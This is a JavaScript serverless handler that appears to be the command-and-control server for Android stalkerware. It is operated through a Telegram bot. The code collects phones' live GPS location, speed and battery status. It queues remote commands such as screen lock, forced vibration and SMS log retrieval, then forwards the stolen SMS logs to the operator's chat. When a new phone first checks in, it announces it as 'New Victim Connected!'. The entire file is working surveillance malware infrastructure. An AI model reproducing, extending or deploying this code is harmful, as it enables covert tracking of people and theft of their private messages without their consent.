// Environment Variables pulled directly from Vercel's Environment Dashboard
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const AUTH_TOKEN = process.env.AUTH_TOKEN; // Your security API Key

import fs from 'fs';
import path from 'path';
const DATA_DIR = path.join(process.cwd(), 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
const DB_FILE = path.join(DATA_DIR, 'devices.json');

function loadAllDevices() {
  try {
    if (!fs.existsSync(DB_FILE)) return new Map();
    const raw = fs.readFileSync(DB_FILE, 'utf8') || '{}';
    const obj = JSON.parse(raw);
    const m = new Map();
    for (const [id, data] of Object.entries(obj.devices || {})) m.set(id, data);
    return m;
  } catch (e) {
    console.error('loadAllDevices error', e);
    return new Map();
  }
}

async function saveDevice(id, data) {
  try {
    const raw = fs.existsSync(DB_FILE) ? fs.readFileSync(DB_FILE, 'utf8') || '{}' : '{}';
    const obj = JSON.parse(raw);
    obj.devices = obj.devices || {};
    obj.devices[id] = data;
    await fs.promises.writeFile(DB_FILE, JSON.stringify(obj, null, 2), 'utf8');
  } catch (e) { console.error('saveDevice error', e); }
}

async function deleteDevice(id) {
  try {
    if (!fs.existsSync(DB_FILE)) return;
    const raw = fs.readFileSync(DB_FILE, 'utf8') || '{}';
    const obj = JSON.parse(raw);
    if (obj.devices && obj.devices[id]) delete obj.devices[id];
    await fs.promises.writeFile(DB_FILE, JSON.stringify(obj, null, 2), 'utf8');
  } catch (e) { console.error('deleteDevice error', e); }
}

// Global in-memory storage buffer (valid while the server instance is warm)
let deviceRegistry = loadAllDevices();

export default async function handler(req, res) {
  try {
    const now = Date.now();
    
    // Auto-clean stale data signatures older than 24 Hours
    const toRemove = [];
    for (const [id, data] of deviceRegistry.entries()) {
      if (now - data.timestamp > 24 * 60 * 60 * 1000) toRemove.push(id);
    }
    for (const id of toRemove) {
      deviceRegistry.delete(id);
      await deleteDevice(id);
    }

    // 1. TELEGRAM WEBHOOK INTAKE (BOT BUTTON CLICKS)
    if (req.body && req.body.callback_query) {
      const cb = req.body.callback_query;
      const callbackData = String(cb.data || '');
      const messageId = cb.message ? cb.message.message_id : null;

      // --- COMMAND: GO BACK TO MAIN MENU ---
      if (callbackData === 'open_menu') {
        const devices = Array.from(deviceRegistry.keys());
        const inline_keyboard = devices.map(id => [
          { text: `🛰️ ${id.replace(/_/g, ' ')}`, callback_data: `locate_${id}` }
        ]);
        
        await sendTelegram('editMessageText', {
          chat_id: CHAT_ID,
          message_id: messageId,
          text: devices.length > 0 ? '<b>Select a device to track:</b>' : '<b>No active devices online in telemetry memory cache.</b>',
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard }
        }).catch(() => {});
        
        await sendTelegram('answerCallbackQuery', { callback_query_id: cb.id }).catch(() => {});
        return res.status(200).send('OK');
      }

      // --- COMMAND: OPEN HARDWARE CONTROLS MENU ---
      if (callbackData.startsWith('control_')) {
        const deviceId = callbackData.replace('control_', '');
        
        const inline_keyboard = [
          [
            { text: '🔒 Lock Device Screen', callback_data: `cmd_${deviceId}_LOCK_DEVICE` },
            { text: '📳 Force Vibrate', callback_data: `cmd_${deviceId}_VIBRATE` }
          ],
          [
            { text: '📩 Fetch Recent SMS Logs', callback_data: `cmd_${deviceId}_GET_SMS_LOGS` }
          ],
          [{ text: '🔙 Back to Tracking View', callback_data: `locate_${deviceId}` }]
        ];

        await sendTelegram('editMessageText', {
          chat_id: CHAT_ID,
          message_id: messageId,
          text: `🎛️ <b>Hardware Control Center</b>\nTarget: <code>${deviceId.replace(/_/g, ' ')}</code>\n\nSelect a remote execution payload sequence below:`,
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard }
        }).catch(() => {});

        await sendTelegram('answerCallbackQuery', { callback_query_id: cb.id }).catch(() => {});
        return res.status(200).send('OK');
      }

      // --- COMMAND: ENQUEUE ACTUAL REMOTE EXECUTION TO DEVICE ---
      if (callbackData.startsWith('cmd_')) {
        // Syntax format: cmd_Device_Name_COMMAND_STRING
        const parts = callbackData.replace('cmd_', '').split('_');
        const commandString = parts.pop(); // Extracts LOCK_DEVICE, GET_SMS_LOGS, etc.
        const deviceId = parts.join('_');  // Rebuilds the model name safely

        const deviceRecord = deviceRegistry.get(deviceId) || { timestamp: Date.now() };
        
        // Push the instruction into the command buffer hook
        deviceRecord.pendingCommand = commandString;
        deviceRegistry.set(deviceId, deviceRecord);
        try { await saveDevice(deviceId, deviceRecord); } catch (e) { console.error('saveDevice error', e); }

        await sendTelegram('answerCallbackQuery', {
          callback_query_id: cb.id,
          text: `🚀 Command "${commandString}" queued for execution!`,
          show_alert: false
        }).catch(() => {});
        return res.status(200).send('OK');
      }

      // --- COMMAND: RENDER MAIN LOCATION GEOLOCATION DASHBOARD ---
      if (callbackData.startsWith('locate_')) {
        const deviceId = callbackData.replace('locate_', '');
        const data = deviceRegistry.get(deviceId);
        
        if (!data) {
          await sendTelegram('answerCallbackQuery', {
            callback_query_id: cb.id,
            text: '❌ Device offline or uninstalled from cache',
            show_alert: true
          }).catch(() => {});
          return res.status(200).send('OK');
        }

        // Fixed string formatting syntax for Maps URL
        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lng}`;
        const batteryEmoji = data.isCharging ? '🔌' : (data.batteryLevel < 20 ? '🪫' : '🔋');
        const speedKmH = (data.speed * 3.6).toFixed(1);

        const textMessage = 
          `📱 <b>Device:</b> ${deviceId.replace(/_/g, ' ')}\n` +
          `⏱️ <b>Speed:</b> ${speedKmH} km/h | <b>Heading:</b> ${Math.round(data.bearing)}°\n` +
          `🎯 <b>GPS Accuracy:</b> Within ${Math.round(data.accuracy)} meters\n` +
          `${batteryEmoji} <b>Battery Status:</b> ${data.batteryLevel}% ${data.isCharging ? '(Charging)' : '(On Battery)'}\n` +
          `🕒 <b>Last Check-in:</b> ${data.time}`;

        const inline_keyboard = [
          [{ text: '🗺️ Open Live Google Maps', url: mapsUrl }],
          [{ text: '🎛️ Open Hardware Controls', callback_data: `control_${deviceId}` }],
          [
            { text: '🔄 Refresh', callback_data: `locate_${deviceId}` },
            { text: '🎛️ Devices Menu', callback_data: 'open_menu' }
          ]
        ];

        await sendTelegram('answerCallbackQuery', { callback_query_id: cb.id }).catch(() => {});

        if (messageId) {
          await sendTelegram('editMessageText', {
            chat_id: CHAT_ID,
            message_id: messageId,
            text: textMessage,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard }
          }).catch(async () => {
            await sendTelegram('sendMessage', {
              chat_id: CHAT_ID,
              text: textMessage,
              parse_mode: 'HTML',
              reply_markup: { inline_keyboard }
            }).catch(() => {});
          });
        }
        return res.status(200).send('OK');
      }
    }

    // 2. CHAT TEXT CMDS INTAKE (/start, /menu)
    if (req.body && req.body.message) {
      const text = req.body.message.text || '';
      if (text === '/start' || text === '/menu') {
        const devices = Array.from(deviceRegistry.keys());
        const inline_keyboard = devices.map(id => [
          { text: `🛰️ ${id.replace(/_/g, ' ')}`, callback_data: `locate_${id}` }
        ]);
        
        await sendTelegram('sendMessage', {
          chat_id: CHAT_ID,
          text: devices.length > 0 ? '<b>Select a device to locate:</b>' : '<b>No active devices online. Run the app on the phone first.</b>',
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard }
        }).catch(() => {});
        return res.status(200).send('OK');
      }
    }

    // 3. RETRIEVED DATA BACK CHANNEL (Handling return payload from GET_SMS_LOGS)
    if (req.method === 'POST' && req.url && req.url.includes('/logs-callback')) {
      if (req.headers['authorization'] !== AUTH_TOKEN) return res.status(401).send('Unauthorized');
      const { logPayload } = req.body;

      await sendTelegram('sendMessage', {
        chat_id: CHAT_ID,
        text: `📟 <b>Retrieved SMS Log Records:</b>\n\n<code>${logPayload}</code>`,
        parse_mode: 'HTML'
      }).catch(() => {});

      return res.status(200).json({ success: true });
    }

    // 4. MAIN TELEMETRY INTAKE ENGINE (POST Requests from Android TrackerService)
    if (req.method === 'POST' && req.body && req.body.deviceID) {
      if (req.headers['authorization'] !== AUTH_TOKEN) return res.status(401).send('Unauthorized');
      
      const deviceID = String(req.body.deviceID).trim().slice(0, 200);
      const lat = Number(req.body.lat);
      const lng = Number(req.body.lng);
      
      const accuracy = Number(req.body.accuracy) || 0;
      const speed = Number(req.body.speed) || 0;
      const bearing = Number(req.body.bearing) || 0;
      const batteryLevel = req.body.batteryLevel !== undefined ? Number(req.body.batteryLevel) : -1;
      const isCharging = req.body.isCharging === true || req.body.isCharging === 'true';

      if (!isFinite(lat) || !isFinite(lng)) {
        return res.status(400).json({ success: false, error: 'Invalid coordinates' });
      }

      const isNewDevice = !deviceRegistry.has(deviceID);
      const activeRecord = deviceRegistry.get(deviceID) || {};
      
      // Pull and clear any instruction waiting in the command buffer pipe
      const assignedCommand = activeRecord.pendingCommand || "NONE";
      
      const record = {
        lat,
        lng,
        accuracy,
        speed,
        bearing,
        batteryLevel,
        isCharging,
        pendingCommand: "NONE", // Reset command buffer once selected
        timestamp: Date.now(),
        time: new Date().toLocaleString('en-GB', { timeZone: 'Africa/Lagos' })
      };
      deviceRegistry.set(deviceID, record);
      try { await saveDevice(deviceID, record); } catch (e) { console.error('saveDevice error', e); }
      

      if (isNewDevice) {
        const cleanName = deviceID.replace(/_/g, ' ');
        const inline_keyboard = [[
          { text: `🛰️ Track ${cleanName}`, callback_data: `locate_${deviceID}` }
        ]];
        
        await sendTelegram('sendMessage', {
          chat_id: CHAT_ID,
          text: `🆕 <b>New Victim Connected!</b>\n\n📱 <b>Model:</b> ${cleanName}\n🔋 <b>Battery:</b> ${batteryLevel}%\n\n🌍 Connection established successfully.`,
          parse_mode: 'HTML',
          reply_markup: { inline_keyboard }
        }).catch(() => {});
      }
      
      // Delivers the command response back directly inside the response object string
      return res.status(200).json({ command: assignedCommand });
    }

    return res.status(200).send('Tracker Endpoint Active');
  } catch (err) {
    console.error('Core routing breakdown', err);
    return res.status(500).send('Internal Server Error');
  }
}

// Global Core Request Dispatch Pipeline to Telegram Systems
async function sendTelegram(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    return resp.ok ? await resp.json() : null;
  } catch (e) {
    return null;
  }
}
